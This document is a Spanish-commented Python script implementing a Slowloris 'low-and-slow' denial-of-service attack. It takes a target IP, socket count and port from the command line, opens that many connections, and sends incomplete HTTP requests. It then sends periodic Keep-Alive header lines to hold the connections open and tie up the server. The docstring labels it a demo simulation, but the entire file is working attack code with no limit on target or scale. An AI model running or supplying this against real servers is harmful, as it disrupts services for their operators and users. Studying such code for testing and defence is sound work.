#!/usr/bin/env python3
"""Simulación Slowloris Low-and-Slow (demo: pocos sockets)."""
import socket
import sys
import time


def mantener_sockets_activos(target_ip, count, port=80, ciclos=30, intervalo=3):
    lista_sockets = []
    print(f"[*] Abriendo {count} conexiones lentas hacia {target_ip}:{port}...")
    for i in range(count):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(4)
            s.connect((target_ip, port))
            s.send(
                f"GET /?id={i} HTTP/1.1\r\n"
                f"Host: {target_ip}\r\n"
                f"User-Agent: SlowlorisTest\r\n".encode("utf-8")
            )
            lista_sockets.append(s)
        except OSError:
            break
    print(f"[+] {len(lista_sockets)} sockets abiertos")
    for ciclo in range(ciclos):
        print(f"[*] Ciclo {ciclo+1}/{ciclos}: manteniendo {len(lista_sockets)} sockets...")
        for s in list(lista_sockets):
            try:
                s.send(b"Keep-Alive: timeout=15, max=100\r\n")
            except OSError:
                lista_sockets.remove(s)
        time.sleep(intervalo)
    for s in lista_sockets:
        try:
            s.close()
        except OSError:
            pass


if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("Uso: python3 slow_attack.py <IP_Destino> <Cantidad_Sockets> [Puerto]")
        sys.exit(1)
    port = int(sys.argv[3]) if len(sys.argv) > 3 else 80
    mantener_sockets_activos(sys.argv[1], int(sys.argv[2]), port=port, ciclos=4, intervalo=3)
